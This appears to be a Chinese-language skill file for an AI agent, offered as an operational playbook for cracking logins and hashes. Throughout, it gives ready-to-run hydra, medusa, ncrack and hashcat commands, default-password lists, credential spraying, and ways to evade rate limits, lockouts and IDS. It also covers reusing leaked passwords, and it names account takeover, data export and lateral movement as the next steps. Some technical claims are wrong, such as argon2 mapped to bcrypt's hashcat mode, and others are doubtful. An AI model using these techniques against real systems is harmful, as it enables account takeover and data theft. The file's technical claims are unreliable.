---
name: cracking
description: 大爱仙尊·假设作业长文（cracking）。先专卡后读本文。
---

> 作业先走 Skill `黑楼兰·硬撼` / `auth_brute_probe.py`。本文件是长文速查，不替代专卡。

# Cracking（口令 / 哈希破解）

> 仅在根路由选择本目录后读取。每个条目都是待验证的检查假设；执行前用当前一手证据确认适用性。

**触发**: 目标有登录/认证界面、暴露服务端口、泄露哈希、或有需要验证的弱口令假设。

## 领域决策直觉

1. **先测默认口令再爆破**——admin/admin123、admin/123456、test/test 命中率远超字典爆破（实际工作已多次以此接管）
2. **锁定策略优先**——识别锁定阈值，在阈值以下操作（或找不限速接口/绕过手段）比硬刚更快
3. **凭证喷洒 > 爆破**——单密码打多账号规避锁定，比单账号撞多密码有效
4. **限速绕过三件套**：XFF 伪造、分布式 IP（代理/云函数）、并发竞态（见 web.md 竞态条目）
5. 拿到哈希先识别格式再选 hashcat mode，别盲跑

---

## 在线爆破

### 默认口令 + 弱口令清单
- **信号**: 任何登录/管理后台/API 认证
- **验证**: 先试 `admin/admin123` `admin/123456` `admin/password` `root/root` `admin/admin` `test/test` `ceshi/123456789` `admin/admin888` + 运营者特征（手机号、品牌拼音、年份）+ `admin/<用户名>123` 模式
- **证实**: 登录成功 → 立即接管
- **升级**: 完整接管 → 数据导出

### Hydra 多协议在线爆破
- **信号**: 目标暴露 SSH/RDP/FTP/HTTP 表单/数据库端口
- **验证**:
  - SSH: `hydra -L users.txt -P pass.txt -e nsr -t 4 ssh://target`
  - RDP: `hydra -L users.txt -P pass.txt rdp://target`（NLA 注意）；`-V` 显示每次尝试
  - HTTP POST 表单: `hydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`
  - MySQL: `hydra -l root -P pass.txt mysql://target` / PostgreSQL / MSSQL / Redis（无认证或 requirepass）
  - API JSON POST: 构造 `http-post-form` 匹配 JSON 响应码
- **证实**: `[STATUS]` 命中成功凭据
- **升级**: 登录 → 数据/权限 → 横向

### Medusa / Ncrack
- **验证**: `medusa -h target -U users.txt -P pass.txt -M ssh`（多协议列表 `-M ssh,ftp,mysql`）；`ncrack -U users.txt -P pass.txt target:22`（异步引擎更快，支持断点续传 `--resume`）
- **升级**: 与 Hydra 交替用，规避 IDS 单工具特征

### 限速绕过
- **验证**（按序）:
  1. `X-Forwarded-For: 随机IP` / `X-Real-IP` / `True-Client-IP`（很多限速只查直连 IP）
  2. 代理轮换（`-x` socks5 链 / AWS/GCP 云函数每请求不同 IP）
  3. HTTP/2 多路复用单连接多请求（h2load）或 HTTP/2 Rapid Reset（CVE-2023-44487 变种）
  4. 分布式 Hydra 多机并行
  5. 并发竞态击穿计数器（见 web.md 竞态条目——先查后增限流）
  6. 识别密码策略避免锁定：`crackmapexec`/LDAP 查域策略，在阈值以下操作，攻击 N-1 次后等窗口重置
- **证实**: 绕过限速后持续爆破
- **升级**: 无锁定压力下完整爆破

### 2026 新增面
- **QUIC/HTTP3 爆破**: 多数 WAF/IDS 只查 TCP，HTTP/3 完全绕过（curl 8.0+ / h3-spec）
- **TLS 1.3 0-RTT 攻击**（Ncrack 新特性）: 减握手延迟提速
- **AI API 端点爆破**: OpenAI 兼容网关的 key 校验错误码可区分成功/失败

---

## 凭证喷洒（Credential Spraying）

### 单密码多账号
- **信号**: 大量用户名已知（注册枚举/数据泄露/默认命名），单账号爆破有锁定风险
- **验证**: 单密码（如 `Password1!` `Aa123456` `admin123`）打全部账号 → 慢速 + 随机扰动（2s±1s）→ 匹配成功/失败响应模式区分
- **证实**: 一批账号中命中弱口令
- **升级**: 命中账号 → 提权（admin 往往同口令）

---

## 离线哈希破解

### Hash 识别
- **验证**: `hashid` / `name-that-hash` / `hash-identifier` 识别格式 → 输出 hashcat mode：
  - MD5 `$1$` → mode 500；SHA256 crypt → 7400；bcrypt `$2a$` → 3200；phpass `$P$`/`$H$` → 400；argon2 → 3200/25600；Kerberos TGS `$krb5tgs$` → 13100；NTLM → 1000；NTDS → 1000
- **升级**: 识别后选 mode 跑 hashcat

### Hashcat 攻击模式
- **验证**:
  - 字典（模式 0）: `hashcat -m 0 -a 0 hash.txt rockyou.txt`
  - 字典+规则: `hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules/best64.rule`（叠加 `d3ad0ne.rule`/`OneRuleToRuleThemAll`）
  - 组合（模式 1）: 两个字典交叉拼接
  - 掩码（模式 3）: `?d?d?d?d?d?d` 数字 / `?l?l?l?l?d?d` 小写+数字 / 键盘对角线 `1qaz2wsx` 类
  - 混合（模式 6/7）: 字典+掩码 `pass?d?d` 
  - 关联（模式 9）: 已知账号相关词
- **证实**: `Cracked: <hash>:<password>`
- **升级**: 口令复用 → 撞其他系统

### GPU/分布式
- **验证**: `--opencl-device-types 1` GPU 加速；分布式 `--distribute` + `--node`（多机 hashcat）；云 GPU（Vast.ai/AutoDL）租卡跑高强度哈希（bcrypt/argon2 慢哈希优先 GPU）
- **升级**: 慢哈希（bcrypt/argon2/scrypt）优先 GPU 而非 CPU

---

## 字典与规则生成

### 定向字典
- **验证**: 目标相关词（品牌/域名/运营者用户名/手机号/年份）+ 规则变换：
  - 后缀 `123` `1234` `123456` `2024` `2025` `@` `!`
  - 前缀 `admin_` `test_` `dev_`
  - 首字母大写（`Admin123`）
  - 键盘对角线（`147258369` `qweasd` `1qaz2wsx`）
  - 运营者特征词（从 GitHub/社工/历史口令推断）
- **工具**: CeWL（爬页面生成词频字典）、crunch（掩码生成）、rsmangler（规则变换）、mentalist
- **升级**: 命中率远高于 rockyou 通用字典

### 泄露口令复用
- **验证**: 目标邮箱/用户名查历史泄露（如果用户提供数据源）→ 提取密码 → 撞目标系统
- **升级**: 跨站撞库

---

## 特殊格式破解

| 目标 | 工具 | 说明 |
|------|------|------|
| ZIP/RAR 压缩包 | `john --format=zip` / `hashcat -m 17200` | 明文密码、ZIP 已知明文攻击（`pkcrack`） |
| Office 文档 | `john` / `hashcat -m 9600/9700` | 老版本弱加密可秒破 |
| PDF | `hashcat -m 10500` | |
| WiFi WPA2 | `aircrack-ng` + 握手包 + hashcat -m 22000 | |
| KeePass | `keepass2john` + hashcat -m 13400 | |
| JWT 密钥 | `hashcat -m 16500` | HS256 弱密钥爆破（见 web.md JWT） |
| SSH 私钥口令 | `ssh2john` | |
| 数据库密文 | 按应用定制 | Dujiao/FastAdmin 等框架常见可逆加密，先还原算法再解 |
